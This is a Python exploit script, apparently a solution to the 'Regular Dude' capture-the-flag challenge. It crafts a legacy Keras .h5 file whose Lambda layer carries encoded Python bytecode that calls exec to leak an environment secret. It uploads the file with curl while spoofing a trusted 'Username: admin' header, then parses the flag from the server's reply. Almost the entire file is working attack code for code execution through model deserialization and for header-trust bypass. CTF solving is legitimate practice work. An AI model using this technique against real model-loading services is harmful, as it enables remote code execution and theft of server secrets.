#!/usr/bin/env python3
import argparse
import json
import re
import subprocess
import sys
import tempfile
from pathlib import Path
from urllib.parse import urlsplit, urlunsplit

import h5py
import numpy as np


FLAG_RE = re.compile(r"RS\{[^}]+\}")

# Marshaled by Python 3.10 for:
# lambda x: exec('import os\nraise Exception(os.environ["FLAG"])')
PY310_LAMBDA_CODE = (
    "4wEAAAAAAAAAAAAAAAEAAAACAAAAQwAAAHMIAAAAdABkAYMBUwApAk76LWltcG9ydCBvcwpyYWlz\n"
    "ZSBFeGNlcHRpb24ob3MuZW52aXJvblsiRkxBRyJdKSkB2gRleGVjKQHaAXipAHIEAAAA2gg8c3Ry\n"
    "aW5nPtoIPGxhbWJkYT4BAAAAcwIAAAAIAA==\n"
)


def build_model_config():
    return {
        "class_name": "Sequential",
        "config": {
            "name": "sequential",
            "layers": [
                {
                    "class_name": "InputLayer",
                    "config": {
                        "batch_shape": [None, 1],
                        "dtype": "float32",
                        "sparse": False,
                        "ragged": False,
                        "name": "input_layer",
                    },
                },
                {
                    "class_name": "Lambda",
                    "config": {
                        "name": "lambda",
                        "trainable": True,
                        "dtype": "float32",
                        "function": [PY310_LAMBDA_CODE, None, None],
                        "arguments": {},
                    },
                },
            ],
            "build_input_shape": [None, 1],
        },
    }


def write_payload(payload_path: Path):
    model_config = build_model_config()
    with h5py.File(payload_path, "w") as h5_file:
        h5_file.attrs["model_config"] = json.dumps(model_config).encode("utf-8")

        # These groups mirror the structure Keras expects for legacy .h5 files.
        model_weights = h5_file.create_group("model_weights")
        model_weights.attrs["backend"] = b"tensorflow"
        model_weights.attrs["keras_version"] = b"3.11.2"
        model_weights.attrs["layer_names"] = np.array([b"lambda"], dtype="S6")

        lambda_group = model_weights.create_group("lambda")
        lambda_group.attrs["weight_names"] = np.array([], dtype="S1")

        top_level_group = model_weights.create_group("top_level_model_weights")
        top_level_group.attrs["weight_names"] = np.array([], dtype="S1")


def build_model_endpoint(base_url: str) -> str:
    parts = urlsplit(base_url)
    path = parts.path.rstrip("/")
    if path.endswith("/model"):
        return base_url
    return urlunsplit((parts.scheme, parts.netloc, f"{path}/model", parts.query, parts.fragment))


def upload_payload(model_url: str, payload_path: Path, username: str) -> str:
    cmd = [
        "curl",
        "-i",
        "-sS",
        "-H",
        f"Username: {username}",
        "-F",
        f"model=@{payload_path}",
        model_url,
    ]
    result = subprocess.run(cmd, check=True, capture_output=True, text=True)
    return result.stdout


def main():
    parser = argparse.ArgumentParser(
        description="Exploit the Regular Dude challenge and recover the flag."
    )
    parser.add_argument(
        "url",
        help="Base challenge URL, for example https://host.ctf.ritsec.club/",
    )
    parser.add_argument(
        "--username",
        default="admin",
        help='Value to place in the trusted Username header. Default: "admin".',
    )
    args = parser.parse_args()

    model_url = build_model_endpoint(args.url)

    with tempfile.TemporaryDirectory() as tmpdir:
        payload_path = Path(tmpdir) / "payload.h5"
        write_payload(payload_path)
        response_text = upload_payload(model_url, payload_path, args.username)

    match = FLAG_RE.search(response_text)
    if match:
        print(match.group(0))
        return

    print(response_text)
    print("Flag not found in server response.", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
